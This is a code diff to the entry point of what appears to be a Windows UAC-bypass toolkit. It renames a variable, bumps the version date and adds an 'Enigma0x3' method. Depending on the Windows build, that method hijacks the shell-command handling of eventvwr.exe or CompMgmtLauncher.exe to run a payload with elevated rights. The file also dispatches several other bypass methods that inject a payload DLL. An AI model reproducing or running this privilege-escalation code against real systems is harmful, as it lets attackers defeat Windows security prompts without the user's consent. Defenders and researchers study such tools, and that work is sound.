@@ -4,9 +4,9 @@
 *
 *  TITLE:       MAIN.C
 *
-*  VERSION:     2.52
+*  VERSION:     2.53
 *
-*  DATE:        17 Jan 2017
+*  DATE:        18 Jan 2017
 *
 *  Program entry point.
 *
@@ -268,7 +268,7 @@ UINT ucmInit(
 UINT ucmMain()
 {
     DWORD   paramLen;
-    WCHAR  *pDllName;
+    WCHAR  *pFileName;
     WCHAR   szBuffer[MAX_PATH * 2];
     UINT    uResult;
 
@@ -534,6 +534,9 @@ UINT ucmMain()
 
     case UacMethodComet:
         break;
+
+    case UacMethodEnigma0x3:
+        break;
     }
 
     //prepare command for payload
@@ -545,7 +548,7 @@ UINT ucmMain()
             supSetParameter((LPWSTR)&szBuffer, paramLen * sizeof(WCHAR));
         }
     }
-
+    
 
     //check environment and execute method if it met requirements
     switch (g_ctx.Method) {
@@ -644,13 +647,13 @@ UINT ucmMain()
         }
 #endif
         if (g_ctx.dwBuildNumber < 9200) {
-            pDllName = POWRPROF_DLL;
+            pFileName = POWRPROF_DLL;
         }
         else {
-            pDllName = DEVOBJ_DLL;
+            pFileName = DEVOBJ_DLL;
         }
 
-        if (ucmWinSATMethod(pDllName, g_ctx.PayloadDll, g_ctx.PayloadDllSize, (g_ctx.dwBuildNumber <= 10136))) {
+        if (ucmWinSATMethod(pFileName, g_ctx.PayloadDll, g_ctx.PayloadDllSize, (g_ctx.dwBuildNumber <= 10136))) {
             return ERROR_SUCCESS;
         }
         break;
@@ -666,7 +669,7 @@ UINT ucmMain()
             return ERROR_SUCCESS;
         }
         break;
-
+        
     case UacMethodSirefef:
 #ifndef _DEBUG
         if (g_ctx.IsWow64) {
@@ -763,7 +766,7 @@ UINT ucmMain()
             return ERROR_SUCCESS;
         }
         break;
-
+        
 #endif
     case UacMethodComet:
         if (ucmCometMethod((paramLen != 0) ? szBuffer : T_DEFAULT_CMD)) {
@@ -771,6 +774,24 @@ UINT ucmMain()
         }
         break;
 
+    case UacMethodEnigma0x3:
+#ifndef _DEBUG
+        if (g_ctx.IsWow64) { //target application isn't always available under wow64
+            ucmShowMessage(WOW64STRING);
+            return ERROR_UNSUPPORTED_TYPE;
+        }
+#endif
+
+        if (g_ctx.dwBuildNumber >= 15007)
+            pFileName = COMPMGMTLAUNCHER_EXE;
+        else
+            pFileName = EVENTVWR_EXE;
+        
+        if (ucmHijackShellCommandMethod((paramLen != 0) ? szBuffer : NULL, pFileName)) {
+            return ERROR_SUCCESS;
+        }
+        break;
+        
     }
 
     return ERROR_ACCESS_DENIED;
